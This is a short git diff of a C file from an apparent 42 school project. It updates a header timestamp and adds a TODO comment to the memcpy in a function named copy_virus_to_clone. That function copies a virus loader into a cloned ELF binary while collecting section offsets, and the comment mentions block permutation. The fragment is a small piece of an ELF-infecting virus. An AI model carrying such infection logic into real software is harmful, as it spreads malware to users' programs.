@@ -6,7 +6,7 @@
 /*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/02/22 21:23:14 by ichkamo           #+#    #+#             */
-/*   Updated: 2020/07/19 18:54:53 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/12/01 21:20:24 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -39,7 +39,7 @@ bool	copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original
 
 	if (!loader_location) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
-	memcpy(loader_location, (void *)loader_entry, virus_size);
+	memcpy(loader_location, (void *)loader_entry, virus_size);//TODO not position indep after block permut
 
 	// gather offsets
 	size_t	shoff            = original_entry->safe_shdr->sh_offset;
